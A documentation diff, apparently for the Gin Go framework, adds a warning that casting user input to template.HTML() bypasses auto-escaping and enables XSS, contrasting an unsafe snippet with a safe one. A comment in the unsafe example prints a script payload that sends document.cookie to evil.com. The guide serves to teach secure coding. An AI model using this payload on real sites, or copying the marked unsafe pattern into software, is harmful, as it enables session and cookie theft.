@@ -105,6 +105,31 @@ func main() {
 }
 ```
 
+### Security warning: `template.HTML()` bypasses auto-escaping
+
+Go's `html/template` package automatically escapes values inserted into templates to prevent Cross-Site Scripting (XSS). However, when you cast a string to `template.HTML()`, you explicitly bypass this protection. If the string contains user-supplied input, an attacker can inject arbitrary JavaScript.
+
+**Unsafe -- never use `template.HTML()` with user input:**
+
+```go
+// DANGEROUS: attacker controls userInput, which could be:
+// <script>document.location='https://evil.com/?cookie='+document.cookie</script>
+c.HTML(http.StatusOK, "page.tmpl", gin.H{
+  "content": template.HTML(userInput), // XSS vulnerability!
+})
+```
+
+**Safe -- let the template engine escape user input automatically:**
+
+```go
+// SAFE: html/template will escape any HTML/JS in userInput
+c.HTML(http.StatusOK, "page.tmpl", gin.H{
+  "content": userInput, // auto-escaped by html/template
+})
+```
+
+Only use `template.HTML()` for content you fully control, such as static HTML snippets defined in your own code. Never use it with values that originate from user input, database fields populated by users, or any other untrusted source.
+
 ### Custom Template renderer
 
 You can also use your own html template render
